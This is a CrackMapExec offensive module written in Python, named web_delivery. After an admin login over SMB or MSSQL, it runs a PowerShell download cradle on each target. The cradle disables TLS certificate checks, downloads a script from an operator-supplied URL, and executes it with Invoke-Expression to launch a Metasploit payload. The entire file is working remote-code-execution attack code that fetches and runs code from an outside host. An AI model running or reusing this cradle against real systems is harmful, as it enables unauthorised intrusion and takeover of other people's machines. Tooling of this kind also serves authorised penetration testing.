from cme.helpers.powershell import *
from sys import exit

class CMEModule:
    '''
        Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
        Reference: https://github.com/EmpireProject/Empire/blob/2.0_beta/data/module_source/code_execution/Invoke-MetasploitPayload.ps1

        Module by @byt3bl33d3r
    '''

    name = 'web_delivery'
    description = 'Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module'
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        URL  URL for the download cradle
        '''

        if not 'URL' in module_options:
            context.log.error('URL option is required!')
            exit(1)

        self.url = module_options['URL']

    def on_admin_login(self, context, connection):
        ps_command = '''[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{}');'''.format(self.url)
        connection.ps_execute(ps_command, force_ps32=True)
        context.log.success('Executed web-delivery launcher')
